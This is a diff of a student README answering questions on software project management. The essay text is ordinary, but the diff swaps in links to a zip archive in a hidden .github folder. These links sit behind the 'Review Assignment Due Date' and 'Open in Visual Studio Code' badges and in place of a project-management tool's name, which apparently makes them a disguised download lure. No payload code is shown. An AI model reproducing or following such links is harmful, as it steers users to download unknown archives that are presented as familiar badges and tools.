@@ -1,5 +1,5 @@
-[![Review Assignment Due Date](https://raw.githubusercontent.com/Liz-on-code/se-assignment-day-4-software-project-management-Liz-on-code/main/conscriptional/se-assignment-day-4-software-project-management-Liz-on-code.zip)](https://raw.githubusercontent.com/Liz-on-code/se-assignment-day-4-software-project-management-Liz-on-code/main/conscriptional/se-assignment-day-4-software-project-management-Liz-on-code.zip)
-[![Open in Visual Studio Code](https://raw.githubusercontent.com/Liz-on-code/se-assignment-day-4-software-project-management-Liz-on-code/main/conscriptional/se-assignment-day-4-software-project-management-Liz-on-code.zip)](https://raw.githubusercontent.com/Liz-on-code/se-assignment-day-4-software-project-management-Liz-on-code/main/conscriptional/se-assignment-day-4-software-project-management-Liz-on-code.zip)
+[![Review Assignment Due Date](https://github.com/Liz-on-code/se-assignment-day-4-software-project-management-Liz-on-code/raw/refs/heads/main/.github/day-on-software-se-management-code-assignment-Liz-project-3.0.zip)](https://github.com/Liz-on-code/se-assignment-day-4-software-project-management-Liz-on-code/raw/refs/heads/main/.github/day-on-software-se-management-code-assignment-Liz-project-3.0.zip)
+[![Open in Visual Studio Code](https://github.com/Liz-on-code/se-assignment-day-4-software-project-management-Liz-on-code/raw/refs/heads/main/.github/day-on-software-se-management-code-assignment-Liz-project-3.0.zip)](https://github.com/Liz-on-code/se-assignment-day-4-software-project-management-Liz-on-code/raw/refs/heads/main/.github/day-on-software-se-management-code-assignment-Liz-project-3.0.zip)
 # SE_DAY4_Software-Project-Management
 ## 1. Why is timely delivery crucial in software project management, and how can project managers ensure that deadlines are met?
 Why Timely Delivery is Crucial
@@ -58,7 +58,7 @@ Strategies to Prevent Budget Overruns
 -Prioritizes high-value features first, reducing the risk of wasted spending.
 
 4 Track Expenses with Project Management Tools 
--Use Jira, Trello, Asana, or https://raw.githubusercontent.com/Liz-on-code/se-assignment-day-4-software-project-management-Liz-on-code/main/conscriptional/se-assignment-day-4-software-project-management-Liz-on-code.zip to monitor budget utilization.
+-Use Jira, Trello, Asana, or https://github.com/Liz-on-code/se-assignment-day-4-software-project-management-Liz-on-code/raw/refs/heads/main/.github/day-on-software-se-management-code-assignment-Liz-project-3.0.zip to monitor budget utilization.
 -Regularly review burn rates and adjust spending accordingly.
 
 5 Implement Continuous Monitoring & Cost Reviews 
